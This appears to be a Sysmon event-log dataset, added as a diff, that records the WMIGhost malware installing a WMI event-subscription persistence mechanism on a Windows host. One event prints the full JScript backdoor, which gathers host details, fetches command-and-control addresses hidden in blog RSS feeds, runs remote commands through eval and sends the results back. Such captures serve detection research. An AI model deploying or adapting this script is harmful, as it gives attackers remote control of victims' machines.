@@ -1,0 +1,143 @@
+<root>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-04-03T18:11:54.098352000Z" />
+      <EventRecordID>7194</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1828" ThreadID="372" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>PC04.example.corp</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-04-03 18:11:54.058</Data>
+      <Data Name="ProcessGuid">{365abb72-f76a-5ca4-0000-0010fa0d1700}</Data>
+      <Data Name="ProcessId">3328</Data>
+      <Data Name="Image">C:\Users\user01\Desktop\WMIGhost.exe</Data>
+      <Data Name="FileVersion">?</Data>
+      <Data Name="Description">?</Data>
+      <Data Name="Product">?</Data>
+      <Data Name="Company">?</Data>
+      <Data Name="CommandLine">"C:\Users\user01\Desktop\WMIGhost.exe" </Data>
+      <Data Name="CurrentDirectory">C:\Users\user01\Desktop\</Data>
+      <Data Name="User">PC04\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-f44e-5ca4-0000-00202baf0a00}</Data>
+      <Data Name="LogonId">0xaaf2b</Data>
+      <Data Name="TerminalSessionId">2</Data>
+      <Data Name="IntegrityLevel">High</Data>
+      <Data Name="Hashes">MD5=0DF40B226A4913A57668B83B7C7B443C,IMPHASH=8812FF21AEB160E8800257140ACAE54B</Data>
+      <Data Name="ParentProcessGuid">{365abb72-f456-5ca4-0000-001095090b00}</Data>
+      <Data Name="ParentProcessId">3032</Data>
+      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\Explorer.EXE</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>20</EventID>
+      <Version>3</Version>
+      <Level>4</Level>
+      <Task>20</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-04-03T18:11:54.178467200Z" />
+      <EventRecordID>7195</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1828" ThreadID="3164" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>PC04.example.corp</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="EventType">WmiConsumerEvent</Data>
+      <Data Name="UtcTime">2019-04-03 18:11:54.178</Data>
+      <Data Name="Operation">Modified</Data>
+      <Data Name="User">PC04\IEUser</Data>
+      <Data Name="Name"> "ProbeScriptFint"</Data>
+      <Data Name="Type">Script</Data>
+      <Data Name="Destination"> "var sXmlUrl=\"http://kumardeep.sosblogs.com/The-first-blog-b1/RSS-b1-rss2-posts.htm;http://blogs.rediff.com/anilchopra/feed/;http://www.blogster.com/kapoorsunil09/profile/rss\";var sOwner='XDD';var MAIN=function(){$=this;$.key='W';$.sFeedUrl=sXmlUrl;$.sOwner=sOwner;$.sXmlUrl='';$.oHttp=null;$.oShell=null;$.oStream=null;$.sHostName=null;$.sOSType=null;$.sMacAddress=null;$.sURLParam=null;$.version='2.0.0';$.runtime=5000;$.oWMI=null;$._x=ActiveXObject;};MAIN.prototype={InitObjects:function(){$.oWMI=GetObject('winmgmts:{impersonationLevel=impersonate}!\\\\\\\\.\\\\root\\\\cimv2');$.oShell=new $._x('WScript.Shell');$.oStream=new $._x('ADODB.Stream');$.GetOSInfo();$.GetMacAddress();$.GenerateUrlParam();},WMI:function(sql){return $.oWMI.ExecQuery(sql);},GetOSInfo:function(){var e=new Enumerator($.WMI('Select * from Win32_OperatingSystem'));if(!e.atEnd()){var item=e.item();$.sOSType=item.Caption+item.ServicePackMajorVersion;$.sHostName=item.CSName;}},GetMacAddress:function(){var e=new Enumerator($.WMI('Select * from Win32_NetworkAdapter where PNPDeviceID like \\\"%PCI%\\\" and NetConnectionStatus=2'));if(!e.atEnd()){$.sMacAddress=e.item().MACAddress;}},GenerateUrlParam:function(){var time=new Date();$.sURLParam='cstype=server&amp;authname=servername&amp;authpass=serverpass&amp;hostname='+$.sHostName+'&amp;ostype='+$.sOSType+'&amp;macaddr='+$.sMacAddress+'&amp;owner='+$.sOwner+'&amp;version='+$.version+'&amp;runtime='+$.runtime;$.sURLParam+='&amp;t='+time.getMinutes()+time.getSeconds();},CleanObjects:function(){$.oShell=null;$.oStream=null;var e=new Enumerator($.WMI('Select * from Win32_Process where Name=\\\"scrcons.exe\\\"'));while(!e.atEnd()){e.item().terminate();e.moveNext();}},Decode:function(sourceStr){var keycode=sourceStr.charCodeAt(0);var source=sourceStr.substr(1);var vals=source.split(',');var result='';for(var i=0;i&lt;vals.length;i++){result+=String.fromCharCode(vals[i]^keycode);}return result;},circleDecode:function(sc){var base=sc.charCodeAt(0);var s=base-32;var r='';for(var i=1;i&lt;sc.length;i++){var nc=sc.charCodeAt(i)-s-i+1;if(nc&lt;32){nc=126+(nc-32)%94;}r+=String.fromCharCode(nc);}return r;},MainLoop:function(){$.oHttp=new $._x('Microsoft.XmlHttp');var feedUrlArry=$.sFeedUrl.split(';');var start=new Date();var oXml=new ActiveXObject('MSXML2.DOMDocument.3.0');for(var n=0;n&lt;feedUrlArry.length;n++){var UrlList=new Array();var URLnum=0;try{var tstr=feedUrlArry[n].match('http://.*?\\\\.php');if(tstr!=null){UrlList[URLnum++]=tstr;}else{$.oHttp.Open('GET',feedUrlArry[n],false);$.oHttp.setRequestHeader('User-Agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.9.1) Gecko/20090624 Firefox/3.5');$.oHttp.Send();var response=$.oHttp.ResponseText.replace(/(^\\s*)|(\\s*$)/g,'');var re=/&lt;title&gt;@(.*)@&lt;\\/title&gt;+/g;var titleList=response.match(re);for(var i=0;i&lt;titleList.length;i++){try{oXml.loadXML(titleList[i]);var container=oXml.getElementsByTagName('title');var tmpstr=container[0].text.match('@(.*)@');UrlList[URLnum++]=$.circleDecode(tmpstr[1]);}catch(e){}}}for(var Urlindex=0;Urlindex&lt;UrlList.length;Urlindex++){$.sXmlUrl=UrlList[Urlindex];var runnum=360;while(runnum--&gt;0){$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam);var response=$.oHttp.ResponseText.replace(/(^\\s*)|(\\s*$)/g,'');if(response.length&gt;0){var commands=null;var container;try{oXml.loadXML(response);container=oXml.getElementsByTagName('div');for(var i=0;i&lt;container.length;i++){if(container[i].getAttribute('id')=='0a552b5a4352'){commands=eval('('+container[i].text+')').command;}}}catch(e){}if(commands!=null){var commandresult='';for(var i=0;i&lt;commands.length;i++){var result='no response';try{result=eval($.Decode(commands[i].value));}catch(e){}if(i&gt;0){commandresult+=',';}commandresult+='\\''+commands[i].id+'\\':\\''+escape(result)+'\\'';}if(commandresult.length&gt;0){commandresult='{'+commandresult+'}';$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam+'&amp;command=result&amp;commandresult='+commandresult);}}else{$.sXmlUrl='';runnum=0;}}$.runtime=(new Date()).getTime()-start.getTime();WScript.Sleep(10000);}if($.sXmlUrl.length&gt;0){return;}}}catch(e){}}},Fire:function(){$.InitObjects();try{$.MainLoop();}catch(e){}$.CleanObjects();}};new MAIN().Fire();"</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>21</EventID>
+      <Version>3</Version>
+      <Level>4</Level>
+      <Task>21</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-04-03T18:11:54.198496000Z" />
+      <EventRecordID>7197</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1828" ThreadID="3164" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>PC04.example.corp</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="EventType">WmiBindingEvent</Data>
+      <Data Name="UtcTime">2019-04-03 18:11:54.198</Data>
+      <Data Name="Operation">Modified</Data>
+      <Data Name="User">PC04\IEUser</Data>
+      <Data Name="Consumer"> "\\\\.\\root\\subscription:ActiveScriptEventConsumer.Name=\"ProbeScriptFint\""</Data>
+      <Data Name="Filter"> "\\\\.\\root\\subscription:__EventFilter.Name=\"ProbeScriptFint\""</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-04-03T18:12:00.016862400Z" />
+      <EventRecordID>7203</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1828" ThreadID="372" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>PC04.example.corp</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-04-03 18:11:59.996</Data>
+      <Data Name="ProcessGuid">{365abb72-f76f-5ca4-0000-0010aa201700}</Data>
+      <Data Name="ProcessId">2636</Data>
+      <Data Name="Image">C:\Windows\System32\wbem\scrcons.exe</Data>
+      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+      <Data Name="Description">WMI Standard Event Consumer - scripting</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">C:\Windows\system32\wbem\scrcons.exe -Embedding</Data>
+      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+      <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+      <Data Name="LogonGuid">{365abb72-701f-5ca5-0000-0020e7030000}</Data>
+      <Data Name="LogonId">0x3e7</Data>
+      <Data Name="TerminalSessionId">0</Data>
+      <Data Name="IntegrityLevel">System</Data>
+      <Data Name="Hashes">MD5=6AEC20B9D4C1AB6F1AB297F28EB6BF93,IMPHASH=CCEC86CC0D16062391CC627BC9466A62</Data>
+      <Data Name="ParentProcessGuid">{365abb72-7020-5ca5-0000-0010ed6a0000}</Data>
+      <Data Name="ParentProcessId">596</Data>
+      <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\system32\svchost.exe -k DcomLaunch</Data>
+    </EventData>
+  </Event>
+</root>
